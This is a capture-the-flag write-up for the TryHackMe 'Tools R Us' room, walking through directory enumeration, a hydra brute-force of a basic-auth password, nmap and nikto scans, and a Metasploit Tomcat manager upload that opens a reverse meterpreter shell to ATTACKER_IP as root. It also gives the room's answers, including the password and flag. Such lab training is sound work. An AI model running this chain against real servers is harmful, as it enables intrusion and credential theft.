# [TryHackMe | Tools R Us](https://tryhackme.com/room/toolsrus) Challenge Room Solution Writeup

## [Task 1 Toys R Us](https://tryhackme.com/room/toolsrus?taskNo=1)

### Question 1: What directory can you find, that begins with a "g"?

Use `gobuster` (`dirbuster` was not pre-installed on the attack box) with the `common.txt` wordlist to map out TARGET_IP. 
```bash
# dirbuster -u http://TARGET_IP -l /usr/share/dirb/wordlists/common.txt

gobuster dir -u http://TARGET_IP -w /usr/share/dirb/wordlists/common.txt        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/guidelines           (Status: 301) [Size: 317] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 459]
/server-status        (Status: 403) [Size: 300]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
From this, we find the **guidelines** directory.

### Question 2: Whose name can you find from this directory?

Use `telnet` to send a `GET` request for the `guidelines` directory on the standard port `80` (or just enter in the address on your browser).
```bash
telnet TARGET_IP 80
Trying TARGET_IP...
Connected to TARGET_IP.
Escape character is '^]'.
GET /guidelines/index.html
Hey <b>bob</b>, did you update that TomCat server?
Connection closed by foreign host.
```
The user **Bob** is named in this directory.

### Question 3: What directory has basic authentication?

Examining the `gobuster` output from Question 1 reveals `/protected (Status: 401) [Size: 459]`, which in both name (**protected**) and status code (401 Unauthorized) tells us that this directory requires basic authentication to access.

### Question 4: What is bob's password to the protected part of the website?

Use `hydra` to brute-force `Bob`'s password with the `rockyou.txt` wordlist. 
```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f http-get://TARGET_IP/protected
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-18 18:06:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://TARGET_IP:80/protected
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
[STATUS] attack finished for TARGET_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-18 18:06:58
```
The recovered password is **bubbles**.

### Question 5: What other port that serves a webs service is open on the machine?

Use `nmap` to quickly scan all ports for the TARGET_IP.
```bash
nmap -p- TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-18 18:14 UTC
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00036s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline
8009/tcp open  ajp13

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
```
**1234** is the other open-port web service. 

### Question 6: What is the name and version of the software running on the port from question 5?

Use a more thorough `nmap` request to discover the software version (note that `-sV` doesn't fully get what we need here).
```bash
nmap -A -p 1234 TARGET_IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-18 18:31 UTC
Nmap scan report for ip-TARGET_IP.ec2.internal (TARGET_IP)
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.37 ms ip-TARGET_IP.ec2.internal (TARGET_IP)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.10 seconds
```
The software and version being run here is **Apache Tomcat/7.0.88**.

### Question 7: Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above.

#### Part A: How many documentation files?

Use `nikto` in verbose mode on port `1234` with path `/manager/html` under `Bob`'s credentials and pipe the results to a `grep` which filters for `documentation` files.
```bash
nikto -h http://TARGET_IP:1234/manager/html -id bob:bubbles -Display V | grep -i documentation
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
V:Tue Aug 18 18:54:42 2026 - 403 for GET:	/manager/html/ATutor/documentation/common/frame_toc.php?section=http://cirt.net/rfiinc.txt?
V:Tue Aug 18 18:54:42 2026 - 403 for GET:	/manager/html/ATutor/documentation/common/search.php?section=http://cirt.net/rfiinc.txt?
V:Tue Aug 18 18:54:42 2026 - 403 for GET:	/manager/html/ATutor/documentation/common/vitals.inc.php?req_lang=http://cirt.net/rfiinc.txt?
V:Tue Aug 18 18:54:45 2026 - 400 for GET:	/manager/html/saf/lib/PEAR/PhpDocumentor/Documentation/tests/559668.php?FORUM[LIB]=http://cirt.net/rfiinc.txt?
V:Tue Aug 18 18:54:45 2026 - 400 for GET:	/manager/html/saf/lib/PEAR/PhpDocumentor/Documentation/tests/559668.php?FORUM[LIB]=http://cirt.net/rfiinc.txt??
```
There are **5** `documentation` files.

#### Part B: What is the server version?

Use `nikto` on port `80` with no extra path or credentials.
```bash
nikto -h http://TARGET_IP:80                          
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          TARGET_IP
+ Target Hostname:    ip-TARGET_IP.ec2.internal
+ Target Port:        80
+ Start Time:         2026-08-18 19:13:20 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xa8 0x583d315d43a92 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-08-18 19:13:30 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
The server version is **Apache/2.4.18**.

#### Part C: What version of Apache-Coyote is this service using?

Use `nikto` on port `1234` with path `/manager/html` under `Bob`'s credentials.
```bash
nikto -h http://TARGET_IP:1234/manager/html -id bob:bubbles
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          TARGET_IP
+ Target Hostname:    ip-TARGET_IP.ec2.internal
+ Target Port:        1234
+ Start Time:         2026-08-18 18:36:11 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Cookie JSESSIONID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2026-08-18 18:36:23 (GMT0) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
The Apache-Coyote version running on this service is **1.1**.

### Question 8: Use Metasploit to exploit the service and get a shell on the system.

Initiate the `Metasploit` session with `msfconsole` and use `search` to find potential Apache Tomcat Manager exploits.
```bash
msf > search tomcat mgr

Matching Modules
================

   #  Full Name                                Disclosure Date  Rank       Check  Name
   -  ---------                                ---------------  ----       -----  ----
   0  exploit/multi/http/tomcat_mgr_deploy     2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   1    \_ target: Automatic                   .                .          .      .
   2    \_ target: Java Universal              .                .          .      .
   3    \_ target: Windows Universal           .                .          .      .
   4    \_ target: Linux x86                   .                .          .      .
   5  exploit/multi/http/tomcat_mgr_upload     2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   6    \_ target: Java Universal              .                .          .      .
   7    \_ target: Windows Universal           .                .          .      .
   8    \_ target: Linux x86                   .                .          .      .
   9  auxiliary/scanner/http/tomcat_mgr_login  .                normal     No     Tomcat Application Manager Login Utility
```
For this task choose `exploit/multi/http/tomcat_mgr_upload`, `set` the parameters accordingly, then `run`.
```bash
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS TARGET_IP
msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
msf exploit(multi/http/tomcat_mgr_upload) > set LHOST ATTACKER_IP
msf exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  bubbles          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][
                                            ...]. Supported proxies: sapni, socks4, socks5, http, so
                                            cks5h
   RHOSTS        TARGET_IP        yes       The target host(s), see https://docs.metasploit.com/docs
                                            /using-metasploit/basics/using-metasploit.html
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undep
                                            loy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  ATTACKER_IP      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.
msf exploit(multi/http/tomcat_mgr_upload) > run
```

#### Part A: What user did you get a shell as?

Use `shell` to query the user identity.
```bash
meterpreter > shell
Process 1 created.
Channel 2 created.
whoami
root
```
The user is **root**.

#### Part B: What flag is found in the root directory?

This can be done inside or outside of the `shell`.
```bash
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```
The recovered flag is **ff1fc4a81affcc7688cf89ae7dc6e0e1**.

